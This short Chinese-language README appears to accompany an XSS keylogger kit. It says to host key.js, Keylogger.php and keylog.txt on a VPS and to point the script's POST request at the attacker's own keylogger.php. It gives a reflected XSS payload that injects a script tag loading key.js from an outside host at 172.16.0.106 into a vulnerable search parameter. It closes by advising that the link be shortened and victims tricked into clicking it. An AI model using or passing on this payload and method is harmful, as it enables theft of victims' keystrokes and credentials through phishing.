 反射型Xss

 将key.js，keylog.txt，Keylogger.php放在vps网站目录下
 
 js中的http.open("POST","http://172.16.0.106/study/Keylogger/keylogger.php",true); 路径换位你的keylogger.php的路径
 
 键盘记录结果存为keylog.txt


 Payload：http://xssvuln/?search=<script src='http://172.16.0.106/study/Keylogger/key.js'></script># 转换为短地址，诱骗点击
